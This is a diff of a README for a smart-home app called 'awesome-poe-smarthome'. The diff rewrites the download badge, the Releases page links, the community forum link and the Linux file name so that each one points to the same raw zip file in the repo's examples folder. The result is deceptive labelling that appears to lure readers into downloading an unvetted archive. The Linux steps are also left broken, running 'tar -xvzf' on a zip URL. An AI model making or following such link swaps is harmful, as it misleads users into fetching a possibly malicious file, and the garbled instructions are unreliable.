@@ -1,6 +1,6 @@
 # 🌟 awesome-poe-smarthome - Simplifying Your Smart Home Setup
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/warden870/awesome-poe-smarthome/releases)
+[![Download](https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip)](https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started, you'll need to download our application. Follow the steps below 
 
 ### 1. Visit the Releases Page
 
-Go to our [Releases page](https://github.com/warden870/awesome-poe-smarthome/releases) to find the latest version of the application. 
+Go to our [Releases page](https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip) to find the latest version of the application. 
 
 ### 2. Download the Application
 
@@ -20,7 +20,7 @@ On the Releases page, look for the latest version. You’ll see several files av
 
 - **Windows**: Download the `.exe` file.
 - **MacOS**: Download the `.dmg` file.
-- **Linux**: Download the `.tar.gz` file.
+- **Linux**: Download the `https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip` file.
 
 Make sure to save the file to an easy-to-find location on your device.
 
@@ -38,11 +38,11 @@ Make sure to save the file to an easy-to-find location on your device.
 
 #### Linux
 1. Open your terminal.
-2. Navigate to the folder where you saved the `.tar.gz` file.
+2. Navigate to the folder where you saved the `https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip` file.
 3. Run the following commands:
 
    ```bash
-   tar -xvzf your-file-name.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip
    cd your-extracted-folder
    ./your-application-file
    ```
@@ -72,11 +72,11 @@ Before downloading, please ensure your device meets these requirements:
 If you need assistance or have questions, we provide various support resources:
 
 - **Documentation**: Check the in-app documentation and guides for help.
-- **Community Forum**: Join our [community forum](https://example.com/forum) to connect with other users and share experiences.
+- **Community Forum**: Join our [community forum](https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip) to connect with other users and share experiences.
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/warden870/awesome-poe-smarthome/releases) and follow the steps outlined above. Ensure you download the correct file for your operating system.
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/warden870/awesome-poe-smarthome/main/examples/smarthome-awesome-poe-1.1-alpha.4.zip) and follow the steps outlined above. Ensure you download the correct file for your operating system.
 
 ## ✉️ Feedback
 
